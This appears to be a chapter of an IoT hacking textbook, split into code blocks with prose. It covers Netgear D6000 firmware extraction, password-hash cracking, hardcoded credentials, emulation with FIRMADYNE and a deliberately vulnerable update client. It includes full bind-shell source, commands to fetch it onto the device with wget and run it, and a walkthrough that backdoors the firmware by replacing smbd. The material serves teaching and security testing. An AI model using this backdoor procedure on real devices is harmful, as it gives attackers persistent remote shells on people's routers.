["```\nintitle:\"Netgear\"  intext:\"Firmware Download\"\n```", "```\n$ **git clone https://github.com/sa7mon/S3Scanner**\n```", "```\n# **cd S3Scanner**\n# **pip3 install -r requirements.txt**\n```", "```\n$ **python3 s3scanner.py vendor_potential_buckets.txt**\n2020-05-01 11:16:42   Warning: AWS credentials not configured. Open buckets will be shown as closed. Run: `aws configure` to fix this.\n2020-05-01 11:16:45   [found] : netgear | AccessDenied | ACLs: unknown - no aws creds\n2020-05-01 11:16:46   [not found] : netgear-dev\n2020-05-01 11:16:46   [not found] : netgear-development\n2020-05-01 11:16:46   [not found] : netgear-live\n2020-05-01 11:16:47   [not found] : netgear-stag\n2020-05-01 11:16:47   [not found] : netgear-staging\n2020-05-01 11:16:47   [not found] : netgear-prod\n2020-05-01 11:16:48   [not found] : netgear-production\n2020-05-01 11:16:48   [not found] : netgear-test\n2020-05-01 11:16:52   [found] : tplink | AccessDenied | ACLs: unknown - no aws creds\n2020-05-01 11:16:52   [not found] : tplinl-dev \n```", "```\n$ **mkdir** **d6000 && cd d6000**\n$ **wget****http://www.downloads.netgear.com/files/GDC/D6000/D6000_V1.0.0.41_1.0.1_FW.zip**\n**unzip D6000_V1.0.0.41_1.0.1_FW.zip**\n```", "```\n$ **binwalk** **-e** **-M** **D6000-V1.0.0.41_1.0.1.bin**\n```", "```\n~/d600/_D6000-V1.0.0.41_1.0.1.bin.extracted$ **find** **.** **-name** **passwd** \n./squashfs-root/usr/bin/passwd\n./squashfs-root/usr/etc/passwd\n```", "```\n$ **cat** **.****/****squashfs****-root/****usr****/****etc****/passwd**\nadmin:$1$$iC.dUsGpxNNJGeOm1dFio/:0:0:root:/:/bin/sh$ \n```", "```\n$ **hashid** **$1****$$iC.dUsGpxNNJGeOm1dFio/**\nAnalyzing '$1$$iC.dUsGpxNNJGeOm1dFio/'\n**[+] MD5 Crypt**\n[+] Cisco-IOS(MD5) \n[+] FreeBSD MD5 \n```", "```\n$ **hashcat** **-a 3 -m** **500** **.****/****squashfs****-root/****usr****/****etc****/passwd**\n…\nSession..........: hashcat\nStatus...........: Exhausted\nHash.Type........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)\nHash.Target......: $1$$iC.dUsGpxNNJGeOm1dFio/\nTime.Started.....: Sat Jan 11 18:36:43 2020 (7 secs)\nTime.Estimated...: Sat Jan 11 18:36:50 2020 (0 secs)\nGuess.Mask.......: ?1?2?2 [3]\nGuess.Charset....: -1 ?l?d?u, -2 ?l?d, -3 ?l?d*!$@_, -4 Undefined \nGuess.Queue......: 3/15 (20.00%)\nSpeed.#2.........:     2881 H/s (0.68ms) @ Accel:32 Loops:15 Thr:8 Vec:1\nSpeed.#3.........:     9165 H/s (1.36ms) @ Accel:32 Loops:15 Thr:64 Vec:1\nSpeed.#*.........:    12046 H/s\nRecovered........: 0/1 (0.00%) Digests, 0/1 (0.00%) Salts\nProgress.........: 80352/80352 (100.00%)\nRejected.........: 0/80352 (0.00%)\nRestore.Point....: 205/1296 (15.82%)\nRestore.Sub.#2...: Salt:0 Amplifier:61-62 Iteration:990-1000\nRestore.Sub.#3...: Salt:0 Amplifier:61-62 Iteration:990-1000\nCandidates.#2....: Xar -> Xpp\nCandidates.#3....: Xww -> Xqx\n\n$1$$iC.dUsGpxNNJGeOm1dFio/:1234                  [s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => \n```", "``` represents`an MD5 Crypt. You can find more details about the supported hash types on the hashcat web page ([https://hashcat.net/hashcat/](https://hashcat.net/hashcat/)).` ``\n\nWe recovered the password `1234`. It took hashcat less than a minute to crack it!\n\n#### Finding Credentials in Configuration Files\n\nUsing a similar approach to the one at the beginning of this section where we located the *passwd* file, let’s search the firmware for other secrets. You can often find hardcoded credentials in the configuration files, which end in the *cfg* extension. The device uses these files to configure the initial state of a service.\n\nLet’s search for files with the *cfg* extension using the `find` command:\n\n```", "```\n\nYou can then look through the configuration files for relevant information. In *romfile.cfg*, for example, we find a number of hardcoded user account credentials:\n\n```", "```\n\nWe’ve discovered three new users called `admin`, `qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyui`, and `anonymous` with their corresponding passwords, which are in plaintext this time.\n\nRemember that we’ve already cracked the credentials for the admin account, yet the password we recovered doesn’t match the one listed here. It’s likely that the first password we found will be replaced by the one in the configuration file on the first boot. Vendors often use configuration files to perform security-related changes when initializing a device. This approach also permits vendors to deploy the same firmware in devices that support different functionalities and require specific settings to operate successfully.\n\n#### Automating Firmware Analysis\n\nThe Firmwalker tool can automate the information gathering and analysis process we just walked through. Install it from [https://github.com/craigz28/firmwalker/](https://github.com/craigz28/firmwalker/), and then run it:\n\n```", "```\n\nThe tool automatically located the files we identified manually, among others that also look suspicious. We’ll leave the examination of these new files as an exercise for you to complete.\n\nNetgear patched the vulnerability caused by the hardcoded credentials in the latest firmware and published a security advisory ([https://kb.netgear.com/30560/CVE-2015-8288-Use-of-Hard-coded-Cryptographic-Key/](https://kb.netgear.com/30560/CVE-2015-8288-Use-of-Hard-coded-Cryptographic-Key/)) that informs customers about this issue.\n\n### Firmware Emulation\n\nIn this section, we’ll show you how to emulate a firmware. Once we’ve done so, we can perform dynamic analysis tests that are only possible while the firmware is operating normally. We’ll use two emulation techniques: binary emulation using *Quick Emulator (QEMU)* and whole firmware emulation using FIRMADYNE. QEMU is an open source machine emulator and analyzer that works with multiple operating systems and programs, whereas FIRMADYNE ([https://github.com/firmadyne/firmadyne/](https://github.com/firmadyne/firmadyne/)) is a platform for automating the emulation and dynamic analysis of Linux-based firmware.\n\n#### Binary Emulation\n\nEmulating a single binary in the firmware is a quick way to infer the related business logic and dynamically analyze the provided functionality for security vulnerabilities. This approach also allows you to use specialized binary analysis tools, disassemblers, and fuzzing frameworks that you usually can’t install in environments with limited resources. Those environments include embedded systems or those that aren’t efficient to use with large and complex inputs, such as a complete device firmware. Unfortunately, you might not be able to emulate binaries that have specialized hardware requirements and look for specific serial ports or device buttons. Also, you might have trouble emulating binaries that depend on shared libraries that get loaded at runtime or those that need to interact with the platform’s other binaries to operate successfully.\n\nTo emulate a single binary, we first need to identify its endianness and the CPU architecture for which it was compiled. You can find the main binaries on Linux distributions in the *bin* folder and list them using the `ls` command, which is preinstalled in Kali Linux:\n\n```", "```\n\nThe `-l` parameter displays extra information about the files, including the paths of *symbolic links* (references to other files or directories). As you can see, all binaries in the directory are symbolic links to the *busybox* executable. In limited environments, such as embedded systems, it’s very common to have only a single binary called *busybox*. This binary performs tasks similar to those of Unix-based operating system executables but uses fewer resources. Attackers have successfully targeted past versions of *busybox*, but the identified vulnerabilities have been mitigated in the latest versions.\n\nTo see the *busybox* executable’s file format, use the `file` command:\n\n```", "```\n\nThe executable file format is for the MIPS CPU architecture, which is very common in lightweight embedded devices. The `MSB` label in the output indicates that the executable follows a big-endian byte ordering (as opposed to an output containing the `LSB` label, which would indicate a little-endian byte ordering).\n\nNow we can emulate the *busybox* executable using QEMU. Install it using `apt-get`:\n\n```", "```\n\nBecause the executables are compiled for MIPS and follow the big-endian byte ordering, we’ll use QEMU’s `qemu-mips` emulator. To emulate little-endian executables, we would have to select the emulator with the `el` suffix, which in this case would be `qemu-mipsel:`\n\n```", "```\n\nYou can now perform the rest of the dynamic analysis by fuzzing, debugging, or even performing symbolic execution. You can learn more about these techniques in *Practical Binary Analysis* by Dennis Andriesse (No Starch Press, 2018).\n\n#### Complete Firmware Emulation\n\nTo emulate the whole firmware rather than a single binary, you can use an open source application called `firmadyne`. FIRMADYNE is based on QEMU, and it’s designed to perform all the necessary configurations of the QEMU environment and host system for you, simplifying the emulation. But note that FIRMADYNE isn’t always completely stable, especially when the firmware interacts with very specialized hardware components, such as device buttons or secure enclave chips. Those parts of the emulated firmware might not work correctly.\n\nBefore we use FIRMADYNE, we need to prepare the environment. The following commands install the packages that this tool needs to operate and clones its repository to our system.\n\n```", "```\n\nAt this point, you should have a *firmadyne* folder on your system. To quickly set up the tool, navigate to the tool’s directory and run *./setup.sh*. Alternatively, you can manually set it up using the steps shown here. Doing so allows you to select the appropriate package managers and tools for your system.\n\nYou’ll also have to install a PostgreSQL database to store information used for the emulation. Create a FIRMADYNE user using the `-P` switch. In this example, we use `firmadyne` as the password, as recommended by the tool’s authors:\n\n```", "```\n\nThen create a new database and load it with the database schema available in the *firmadyne* repository folder:\n\n```", "```\n\nNow that the database is set up, download the prebuilt binaries for all the FIRMADYNE components by running the *download.sh* script located in the repository folder. Using the prebuilt binaries will significantly reduce the overall setup time.\n\n```", "```\n\nThen set the `FIMWARE_DIR` variable to point to the current working repository in the *firmadyne.config*`file located in the same folder. This change allows FIRMADYNE to locate the binaries in the Kali Linux filesystem.`\n\n ```", "```` ``` FIRMWARE_DIR=**/home/root/Desktop/****firmadyne** … ```    In this example, the folder is saved on the Desktop, but you should replace the path with the folder’s location on your system. Now copy or download the firmware for the D6000 device (obtained in “Hacking a Wi-Fi Modem Router” on page 211) into this folder:    ``` $ **wget** **http://www.downloads.netgear.com/files/GDC/D6000/D6000_V1.0.0.41_1.0.1_FW.zip** ```    FIRMADYNE includes an automated Python script for extracting the firmware. But to use the script, you must first install Python’s `binwalk` module:    ``` $ **git clone https://github.com/ReFirmLabs/binwalk.git** $ **cd** **binwalk** $ **sudo** **python setup.py install** ```    We use the `python` command to initialize and set up `binwalk`. Next, we need two more `python` packages, which we can install using Python’s `pip` package manager:    ``` $ **sudo** **-H pip install** **git+https****://github.com/****ahupp****/python-magic** $ **sudo** **-H pip install** **git+https****://github.com/****sviehb****/****jefferson** ```    Now you can use FIRMADYNE’s *extractor.py* script to extract the firmware from the compressed file:    ``` $ **.****/sources/extractor/extractor.py -b Netgear -****sql 127.0.0.1 -np -nk** **\"D6000_V1.0.0.41_1.0.1_FW.zip\" images** >> Database Image ID: 1 /home/user/Desktop/firmadyne/D6000_V1.0.0.41_1.0.1_FW.zip >> MD5: 1c4ab13693ba31d259805c7d0976689a >> Tag: 1 >> Temp: /tmp/tmpX9SmRU >> Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True >>>> Zip archive data, at least v2.0 to extract, compressed size: 9667454, uncompressed size: 9671530, name: D6000-V1.0.0.41_1.0.1.bin >> Recursing into archive ... /tmp/tmpX9SmRU/_D6000_V1.0.0.41_1.0.1_FW.zip.extracted/D6000-V1.0.0.41_1.0.1.bin     >> MD5: 5be7bba89c9e249ebef73576bb1a5c33     >> Tag: 1 1     >> Temp: /tmp/tmpa3dI1c     >> Status: Kernel: True, Rootfs: False, Do_Kernel: False,                 Do_Rootfs: True     >> Recursing into archive ...     >>>> Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8252568          bytes, 1762 inodes, blocksize: 131072 bytes, created: 2015-01-24 10:52:26     Found Linux filesystem in /tmp/tmpa3dI1c/_D6000-V1.0.0.41_1.0.1.bin.extracted/squashfs-     root! 2  >> Skipping: completed!         >> Cleaning up /tmp/tmpa3dI1c... >> Skipping: completed! >> Cleaning up /tmp/tmpX9SmRU... ```    The `-b` parameter specifies the name used to store the results of the extraction. We opted to use the firmware vendor’s name. The `-sql` parameter sets the location of the SQL database. Next, we use two flags recommended by the application’s documentation. The `-nk` parameter keeps any Linux kernel included in the firmware from being extracted, which will speed up the process. The `-np` parameter specifies that no parallel operation will be performed.    If the script is successful, the final lines of the output will contain a message indicating that it found the Linux filesystem 2. The `1` tag 1 indicates that the extracted images are located at *./images/1.tar.gz*.    Use the *getArch.sh* script to automatically identify the firmware’s architecture and store it in the FIRMADYNE database:    ``` $ **./scripts/getArch.sh ./images/1.tar.gz** ./bin/busybox: mipseb ```    FIRMADYNE identified the `mipseb` executable format, which corresponds to MIPS big-endian systems. You should have expected this output, because we got the same result when we used the `file` command in “Binary Emulation” on page 217 to analyze the header of a single binary.    Now we’ll use the *tar2db.py* and *makeImage.sh* scripts to store information from the extracted image in the database and generate a QEMU image that we can emulate.    ``` $**./****scripts/tar2db.py -****i** **1 -f ./images/1.tar.gz** $./**scripts/makeImage.sh 1** Querying database for architecture... Password for user firmadyne:  mipseb … Removing /etc/scripts/sys_resetbutton! ----Setting up FIRMADYNE---- ----Unmounting QEMU Image---- loop deleted : /dev/loop0 ```    We provide the tag name with the `-i` parameter and the location of the extracted firmware with the `–f` parameter.    We also have to set up the host device so it can access and interact with the emulated device’s network interfaces. This means that we need to configure an IPv4 address and the proper network routes. The *inferNetwork.sh* script can automatically detect the appropriate settings:    ``` $ **./scripts/inferNetwork.sh 1** Querying database for architecture... Password for user firmadyne:  mipseb Running firmware 1: terminating after 60 secs... qemu-system-mips: terminating on signal 2 from pid 6215 (timeout) Inferring network... Interfaces: [('br0', **'192.168.1.1'**)] Done! ```    FIRMADYNE successfully identified an interface with the IPv4 address `192.168.1.1` in the emulated device. Additionally, to begin the emulation and set up the host device’s network configuration, use the *run.sh* script, which is automatically created in the *./scratch/1/*`folder:`   ````", "``` $ **./scratch/1/run.sh** Creating TAP device tap1_0... Set 'tap1_0' persistent and owned by uid 0 Bringing up TAP device... Adding route to 192.168.1.1... Starting firmware emulation... use Ctrl-a + x to exit [    0.000000] Linux version 2.6.32.70 (vagrant@vagrant-ubuntu-trusty-64) (gcc version 5.3.0 (GCC) ) #1 Thu Feb 18 01:39:21 UTC 2016 [    0.000000]  [    0.000000] LINUX started... … Please press Enter to activate this console.  tc login:**admin** Password:  #  ```", "``` $ **ls** bin               firmadyne         lost+found        tmp boaroot           firmware_version  proc              userfs dev               lib               sbin              usr etc               linuxrc           sys               var ```", "``` $ **cat /****etc****/passwd**  admin:$1$$I2o9Z7NcvQAKp7wyCTlia0:0:0:root:/:/bin/sh qwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwertyuiopqwerty ```", "``` anonymous:$1$$D3XHL7Q5PI3Ut1WUbrnz20:0:0:root:/:/bin/sh ```", "``` $ **netstat -a -n -u -t** Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN       tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN       tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN       tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN       tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN       tcp        0      0 :::80                   :::*                    LISTEN       tcp        0      0 :::53                   :::*                    LISTEN       tcp        0      0 :::443                  :::*                    LISTEN       udp        0      0 192.168.1.1:137         0.0.0.0:*                            udp        0      0 0.0.0.0:137             0.0.0.0:*                            udp        0      0 192.168.1.1:138         0.0.0.0:*                            udp        0      0 0.0.0.0:138             0.0.0.0:*                            udp        0      0 0.0.0.0:50851           0.0.0.0:*                            udp        0      0 0.0.0.0:53              0.0.0.0:*                            udp        0      0 0.0.0.0:67              0.0.0.0:*                            udp        0      0 :::53                   :::*                                 udp        0      0 :::69                   :::*  ```", "``` $ **iptables --policy INPUT ACCEPT** $ **iptables --policy FORWARD ACCEPT** $ **iptables --policy OUTPUT ACCEPT** $ **iptables -F** ```", "``` #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sys/types.h> #include <sys/socket.h> #include <netinet/in.h>  #define SERVER_PORT\t9999  /* CC-BY: Osanda Malith Jayathissa (@OsandaMalith)   * Bind Shell using Fork for my TP-Link mr3020 router running busybox   * Arch : MIPS   * mips-linux-gnu-gcc mybindshell.c -o mybindshell -static -EB -march=24kc   */ int main() {         int serverfd, clientfd, server_pid, i = 0;         char *banner = \"[~] Welcome to @OsandaMalith's Bind Shell\\n\";         char *args[] = { \"/bin/busybox\", \"sh\", (char *) 0 };         struct sockaddr_in server, client;         socklen_t len; **int x =** **fork(****);** **if (x ==** **0){**         server.sin_family = AF_INET;         server.sin_port = htons(SERVER_PORT);         server.sin_addr.s_addr = INADDR_ANY;           serverfd = socket(AF_INET, SOCK_STREAM, 0);         bind(serverfd, (struct sockaddr *)&server, sizeof(server));         listen(serverfd, 1);      while (1) {          len = sizeof(struct sockaddr);         clientfd = accept(serverfd, (struct sockaddr *)&client, &len);         server_pid = fork();          if (server_pid) {              write(clientfd, banner,  strlen(banner));             for(; i <3 /*u*/; i++) dup2(clientfd, i);             execve(\"/bin/busybox\", args, (char *) 0);             close(clientfd);          } close(clientfd);     }  **}** return 0; } ```", "``` $ **git clone https://github.com/openwrt/openwrt** $ **cd** **openwrt** $ **.****/scripts/feeds update -a** $ **.****/scripts/feeds install -a** $ **make** **menuconfig** ```", "``` $ **make toolchain/install** time: target/linux/prereq#0.53#0.11#0.63 make[1] toolchain/install make[2] tools/compile make[3] -C tools/flock compile … ```", "``` $ **export STAGING_DIR=\"/root/Desktop/****mips_backdoor****/****openwrt****/****staging_dir****\"** $ **./openwrt/staging_dir/toolchain-mips_24kc_gcc-8.3.0_musl/bin/mips-openwrt-linux-gcc** **bindshell.c** **-o** **bindshell****-static -EB -march=24kc** ```", "``` $ **p****ython -m** **SimpleHTTPServer** **8080 /** ```", "``` $ **wget** **http://192.168.1.2:8080/bindshell** Connecting to 192.168.1.2[192.168.1.2]:80 bindshell 100% |*****************************| 68544       00:00 ETA $ **chmod** **+****x .****/****bindshell** $ **.****/****bindshell** ```", "``` $ **nc** **192.168.1.1 9999** [~] Welcome to @OsandaMalith's Bind Shell ls -l drwxr-xr-x    2 0        0            4096 bin drwxr-xr-x    4 0        0            4096 boaroot drwxr-xr-x    6 0        0            4096 dev … ```", "``` $ **sudo** **apt-get install git build-essential zlib1g-dev** **liblzma****-dev python-magic** **bsdmainutils** ```", "````` ``` $ **git clone https://github.com/rampageX/firmware-mod-kit** $ **cd firmware-mod-kit** $ **./extract-firmware.sh D6000-V1.0.0.41_1.0.1.bin**  Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake Preparing tools ... … Extracting 1418962 bytes of  header image at offset 0 Extracting squashfs file system at offset 1418962 Extracting 2800 byte footer from offset 9668730 Extracting squashfs files... Firmware extraction successful! Firmware parts can be found in '/root/Desktop/firmware-mod-kit/fmk/*' ```    For the attack to be successful, the firmware should replace an existing binary that runs automatically, guaranteeing that any normal use of the device will trigger the backdoor. During the dynamic analysis phase, we indeed identified a binary like that: an SMB service running at port 445\\. You can find the *smbd* binary in the */userfs/bin/smbd* directory. Let’s replace it with the bindshell:    ``` $ **cp bindshell /userfs/bin/smbd** ```    After replacing the binary, reconstruct the firmware using the `build-firmware` script:    ``` $ **./build-firmware.sh** firmware Mod Kit (build) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake Building new squashfs file system... (this may take several minutes!) Squashfs block size is 128 Kb … Firmware header not supported; firmware checksums may be incorrect.  New firmware image has been saved to: /root/Desktop/firmware-mod-kit/fmk/new-firmware.bin ```    Then use `firmadyne` to verify that when the firmware boots, the bindshell is still working. Using `netstat`, you can verify that the firmware’s SMB service, which normally listens for new connections at port 445, has been replaced with the backdoor agent, which listens for new connections on port 9999:    ``` $ **netstat -a -n -u -t** Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address           Foreign Address         State       tcp        0      0 0.0.0.0:3333            0.0.0.0:*               LISTEN       `tcp        0      0 0.0.0.0:9999            0.0.0.0:*`               LISTEN       tcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN       tcp        0      0 192.168.1.1:23          0.0.0.0:*               LISTEN       tcp        0      0 :::80                   :::*                    LISTEN       tcp        0      0 :::53                   :::*                    LISTEN       tcp        0      0 :::443                  :::*                    LISTEN       udp        0      0 0.0.0.0:57218           0.0.0.0:*                            udp        0      0 192.168.1.1:137         0.0.0.0:*                            udp        0      0 0.0.0.0:137             0.0.0.0:*                            udp        0      0 192.168.1.1:138         0.0.0.0:*                            udp        0      0 0.0.0.0:138             0.0.0.0:*                            udp        0      0 0.0.0.0:53              0.0.0.0:*                            udp        0      0 0.0.0.0:67              0.0.0.0:*                            udp        0      0 :::53                   :::*                                 udp        0      0 :::69                   :::*  ```    Instead of replacing the binary, you could patch the binary to provide the legitimate functionality and the bindshell. This would make users less likely to detect the backdoor. We leave this as an exercise for you to complete.    ## Targeting Firmware Update Mechanisms    A firmware’s update mechanism is a significant attack vector and is one of the top 10 IoT vulnerabilities according to OWASP. The *firmware update mechanism* is the process that fetches a newer version of the firmware, whether through the vendor’s website or an external device such as a USB drive, and installs it by replacing the earlier version. These mechanisms can introduce a range of security problems. They often fail to validate the firmware or use unencrypted network protocols; some lack anti-rollback mechanisms or don’t notify the end user about any security changes that resulted from the update. The update process might also exacerbate other problems in the device, such as the use of hardcoded credentials, an insecure authentication to the cloud component that hosts the firmware, and even excessive and insecure logging.    To teach you about all these issues, we’ve created a deliberately vulnerable firmware update service. This service consists of an emulated IoT device that fetches firmware from an emulated cloud update service. You can download the files for this exercise from the book’s website at [https://nostarch.com/practical-iot-hacking/](https://nostarch.com/practical-iot-hacking/). This update service might be included in the future as part of IoTGoat, a deliberately insecure firmware based on OpenWrt whose goal is to teach users about common vulnerabilities in IoT devices. The authors of this book contribute to that project.    To deliver the new firmware file, the server will listen on TCP port `31337`. The client will connect to the server on that port and authenticate using a preshared hardcoded key. The server will then send the following to the client, in order: the firmware length, an MD5 hash of the firmware file, and the firmware file. The client will verify the integrity of the firmware file by comparing the received MD5 hash with a hash of the firmware file, which it calculates using the same preshared key (which it used to authenticate earlier). If the two hashes match, it writes the received firmware file to the current directory as *received_firmware.gz*.    ### Compilation and Setup    Although you can run the client and the server on the same host, ideally you would run them on separate hosts to mimic a real update process. So we recommend compiling and setting up the two components on separate Linux systems. In this demonstration, we’ll use Kali Linux for the update server and Ubuntu for the IoT client, but you should be able to use any Linux distribution, as long as you’ve installed the proper dependencies. Install the following packages on both machines:    ``` # **apt-get install build-essential** **libssl****-dev** ```    Navigate to the client directory and use the *makefile* included there to compile the client program by entering the following:    ``` $ **make client** ```    This should create the executable *client* file on the current directory*.* Next, compile the server on the second machine. Navigate to the directory where the *makefile* and *server.c* reside and compile them by entering this command:    ``` $ **make server** ```    We won’t analyze the server code, because in a real security assessment, you’d most likely only have access to the client binary (not even the source code!) from the firmware filesystem. But for educational purposes, we’ll examine the client’s source code to shed some light on the underlying vulnerabilities.    ### The Client Code    Now let’s look at the client code. This program, written in C, is available at [https://nostarch.com/practical-iot-hacking/](https://nostarch.com/practical-iot-hacking/). We’ll highlight only the important parts:    ``` #define PORT 31337 #define FIRMWARE_NAME \"./received_firmware.gz\" #define KEY \"jUiq1nzpIOaqrWa8R21\" ```    The `#define` directives define constant values. We first define the server port on which the update service will be listening. Next, we specify a name for the received firmware file. Then we hardcode an authentication key that has already been shared with the server. Using hardcoded keys is a security problem, as we’ll explain later.    We’ve split the code from the client’s `main()` function into two separate listings for better clarity. [Listing 9-2](#listing9-2) is the first part.   ``` int main(int argc, char **argv) {   struct sockaddr_in servaddr;   int sockfd, filelen, remaining_bytes;   ssize_t bytes_received;   size_t offset;   unsigned char received_hash[16], calculated_hash[16];   unsigned char *hash_p, *fw_p;   unsigned int hash_len;   uint32_t hdr_fwlen;   char server_ip[16] = \"127.0.0.1\"; 1   FILE *file;    if (argc > 1) 2     strncpy((char *)server_ip, argv[1], sizeof(server_ip) - 1);    openlog(\"firmware_update\", LOG_CONS | LOG_PID | LOG_NDELAY, LOG_LOCAL1);   syslog(LOG_NOTICE, \"firmware update process started with PID: %d\", getpid());    memset(&servaddr, 0, sizeof(servaddr)); 3   servaddr.sin_family = AF_INET;   inet_pton(AF_INET, server_ip, &(servaddr.sin_addr));   servaddr.sin_port = htons(PORT);   if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0)     fatal(\"Could not open socket %s\\n\", strerror(errno));    if (connect(sockfd, (struct sockaddr *)&servaddr, sizeof(struct sockaddr)) == -1)     fatal(\"Could not connect to server %s: %s\\n\", server_ip, strerror(errno));    /* send the key to authenticate */   write(sockfd, &KEY, sizeof(KEY)); 4   syslog(LOG_NOTICE, \"Authenticating with %s using key %s\", server_ip, KEY);    /* receive firmware length */   recv(sockfd, &hdr_fwlen, sizeof(hdr_fwlen), 0); 5   filelen = ntohl(hdr_fwlen);   printf(\"filelen: %d\\n\", filelen); ```    Listing 9-2: The first half of the insecure firmware update client’s `main(``)` function    The main function begins by defining variables for networking purposes and to store values used throughout the program. We won’t explain the network programming part of the code in detail. Rather, we’ll focus on the high-level functionality. Notice the `server_ip` variable 1, which stores the server’s IP address as a null-terminated C string. If the user doesn’t specify any argument in the command line when starting the client, the IP address will default to the localhost (`127.0.0.1`). Otherwise, we copy the first argument, `argv[1]` (because `argv[0]` is always the program’s filename), to the `server_ip`2. Next, we open a connection to the system logger and instruct it to prepend all messages it receives in the future with the `firmware_update` keyword,``followed by the caller’s process identifier (PID). From then on, every time the program calls the `syslog` function, it sends messages to the */var/log/messages* file—the general system activity log, which is typically used for noncritical, nondebugging messages.``   ````The next code block prepares the TCP socket (through the socket descriptor `sockfd`) 3 and initiates the TCP connection to the server. If the server is listening on the other end, the client will successfully conduct the TCP three-way handshake. It can then begin sending or receiving data through the socket.    The client then authenticates to the server by sending the `KEY` value defined earlier 4. It sends another message to `syslog` indicating that it’s trying to authenticate using this key. This action is an example of two insecure practices: excessive logging and the inclusion of sensitive information in log files. The preshared secret key is now written to a log that unprivileged users might be able to access. You can read more about these issues at [https://cwe.mitre.org/data/definitions/779.html](https://cwe.mitre.org/data/definitions/779.html)and [https://cwe.mitre.org/data/definitions/532.html](https://cwe.mitre.org/data/definitions/532.html).    After the client authenticates successfully, it waits to receive the firmware length from the server, storing that value in `hdr_fwlen`, and then converts it from network-byte order to host-byte order by calling `ntohl` 5.    [Listing 9-3](#listing9-3) shows the second part of the main function.    ```  /* receive hash */   recv(sockfd, received_hash, sizeof(received_hash), 0); 1    /* receive file */   if (!(fw_p = malloc(filelen))) 2     fatal(\"cannot allocate memory for incoming firmware\\n\");    remaining_bytes = filelen;   offset = 0;   while (remaining_bytes > 0) {     bytes_received = recv(sockfd, fw_p + offset, remaining_bytes, 0);     offset += bytes_received;      remaining_bytes -= bytes_received; #ifdef DEBUG     printf(\"Received bytes %ld\\n\", bytes_received); #endif   }    /* validate firmware by comparing received hash and calculated hash */   hash_p = calculated_hash;   hash_p = HMAC(EVP_md5(), &KEY, sizeof(KEY) - 1, fw_p, filelen, hash_p, &hash_len); 3    printf(\"calculated hash: \");   for (int i = 0; i < hash_len; i++)     printf(\"%x\", hash_p[i]);   printf(\"\\nreceived hash: \");   for (int i = 0; i < sizeof(received_hash); i++)     printf(\"%x\", received_hash[i]);   printf(\"\\n\");    if (!memcmp(calculated_hash, received_hash, sizeof(calculated_hash))) 4     printf(\"hashes match\\n\");   else     fatal(\"hash mismatch\\n\");  /* write received firmware to disk */   if (!(file = fopen(FIRMWARE_NAME, \"w\")))     fatal(\"Can't open file for writing %s\\n\", strerror(errno));   fwrite(fw_p, filelen, 1, file); 5    syslog(LOG_NOTICE, \"Firmware downloaded successfully\"); 6   /* clean up */   free(fw_p);   fclose(file);   close(sockfd);   closelog();   return 0; ```    Listing 9-3: The second half of the insecure firmware update client’s `main(``)` function    After receiving the firmware length (stored in variable `filelen`), the client receives the firmware file’s MD5 hash (stored in variable `received_hash`) 1. Then, based on the firmware length, it allocates enough memory on the heap to receive the firmware file 2. The `while` loop gradually receives the firmware file from the server and writes it in that allocated memory.    The client then calculates the firmware file’s MD5 hash (`calculated_hash`) using the preshared key 3. For debugging purposes, we also print the calculated and received hashes. If the two hashes match 4, the client creates a file in the current directory using a filename taken from the value of `FIRMWARE_NAME`. It then dumps the firmware 5, which was stored in memory (pointed to by `fw_p`), to that file on the disk. It sends a final message to `syslog`6 about completing the new firmware download, does some cleanup, and exits.    ### Running the Update Service    To test the update service, we first execute the server. We do so on an Ubuntu host with the IP address 192.168.10.219\\. Once the server starts listening, we run the client, passing it the server’s IP address as its first argument. We run the client on a Kali host with the IP address 192.168.10.10:    ``` root@kali:~/firmware_update# **ls** client client.c Makefile root@kali:~/firmware_update# **./client 192.168.10.219** filelen: 6665864 calculated hash: d21843d3abed62af87c781f3a3fda52d received hash: d21843d3abed62af87c781f3a3fda52d hashes match  root@kali:~/firmware_update# **ls** client client.c Makefile received_firmware.gz ```    The client connects to the server and fetches the firmware file. Notice the newly downloaded firmware file in the current directory once the execution completes. The following listing shows the server’s output. Make sure the server is up before you run the client.    ``` user@ubuntu:~/fwupdate$ ./server Listening on port 31337 Connection from 192.168.10.20 Credentials accepted. hash: d21843d3abed62af87c781f3a3fda52d filelen: 6665864 ```    Note that because this is an emulated service, the client doesn’t actually update any firmware after downloading the file.    ### Vulnerabilities of Firmware Update Services    Let’s now inspect the vulnerabilities in this insecure firmware update mechanism.    #### Hardcoded Credentials    First, the client authenticates to the server using a hardcoded password. The use of hardcoded credentials (such as passwords and cryptographic keys) by IoT systems is a huge problem for two reasons: one because of the frequency with which they’re found in IoT devices and the other because of the consequences of their exploitation. Hardcoded credentials are embedded in the binary files rather than in configuration files. This makes it almost impossible for end users or administrators to change them without intrusively modifying the binary files in ways that risk breaking them. Also, if malicious actors ever discover the hardcoded credential by binary analysis or reverse engineering, they can leak it on the internet or in underground markets, allowing anyone to access the endpoint. Another problem is that, more often than not, these hardcoded credentials are the same for each installation of the product, even across different organizations. The reason is that it’s easier for vendors to create one master password or key instead of unique ones for every device. In the following listing, you can see part of the output from running the `strings` command against the *client* binary file, which reveals the hardcoded password (highlighted):    ``` QUITTING! firmware_update firmware update process started with PID: %d Could not open socket %s Could not connect to server %s: %s **jUiq1nzpIOaqrWa8R21** Authenticating with %s using key %s filelen: %d cannot allocate memory for incoming firmware calculated hash:  received hash:  hashes match hash mismatch ./received_firmware.gz Can't open file 